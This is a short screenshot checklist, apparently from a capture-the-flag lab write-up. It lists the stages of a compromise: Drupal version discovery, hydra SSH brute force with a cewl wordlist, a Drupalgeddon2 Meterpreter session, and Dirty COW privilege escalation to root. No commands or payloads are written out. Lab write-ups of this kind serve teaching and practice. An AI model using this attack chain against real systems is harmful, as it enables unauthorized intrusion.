- [ ] `images/02-drupal.png` — the site, `CHANGELOG.txt` → 7.54, authors `tiago`/`eder`
- [ ] `images/03-ssh.png` — `cewl` wordlist, `hydra` result, and the SSH banner
- [ ] `images/04-drupal.png` — Drupalgeddon2 Meterpreter session as `www-data`
- [ ] `images/05-dcow.png` — Linux Exploit Suggester output and the `g++` build
- [ ] `images/06-flag.png` — `su firefart`, root shell, and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
